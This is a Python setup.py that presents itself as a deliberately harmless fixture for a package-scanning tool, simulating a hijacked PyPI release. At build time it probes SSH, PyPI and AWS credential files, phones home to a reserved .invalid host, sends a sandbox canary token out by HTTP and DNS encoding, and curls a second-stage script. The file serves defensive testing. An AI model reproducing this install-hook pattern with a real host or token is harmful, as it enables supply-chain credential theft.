"""A SIMULATION of a hijacked release, as a Python source distribution.

The code below runs when pip builds the package, the way real PyPI attacks
do. It is harmless by construction. Files are opened and closed without
being read. The only host name used is under `.invalid`, which is reserved
by RFC 2606 and can never resolve. And the one value it sends is the marker
pkgsnitch plants in its own sandbox: outside that sandbox, step 3 does
nothing at all. It exists so that `pkgsnitch diff` has something to catch.
"""
import os
import socket
import subprocess
import urllib.request

from setuptools import setup

HOST = "collect.pkgsnitch-demo.invalid"

# 1. Go looking for credentials.
for secret in (".ssh/id_rsa", ".pypirc", ".aws/credentials"):
    try:
        open(os.path.join(os.path.expanduser("~"), secret)).close()
    except OSError:
        pass

# 2. Phone home.
try:
    urllib.request.urlopen(f"https://{HOST}/v1/collect", data=b"", timeout=2)
except Exception:
    pass

# 3. Steal the upload token from the environment: once in a request body and
#    once smuggled out as a DNS name. Only the sandbox's planted value is
#    ever sent; a real token is left alone.
token = os.environ.get("TWINE_PASSWORD", "")
if "pkgsnitchCanary" in token:
    try:
        urllib.request.urlopen(f"http://{HOST}/v1/token", data=token.encode(), timeout=2)
    except Exception:
        pass
    try:
        socket.getaddrinfo(f"{token.encode().hex()}.{HOST}", 80)
    except OSError:
        pass

# 4. Try to fetch a second stage with a system tool.
try:
    subprocess.run(["curl", "-fsSL", f"https://{HOST}/stage2.sh"], timeout=3, capture_output=True)
except Exception:
    pass

setup(
    name="pkgsnitch_demo_slugify",
    version="1.0.1",
    description="Demo fixture for pkgsnitch: a simulated compromised release. Harmless by construction.",
    packages=["pkgsnitch_demo_slugify"],
)
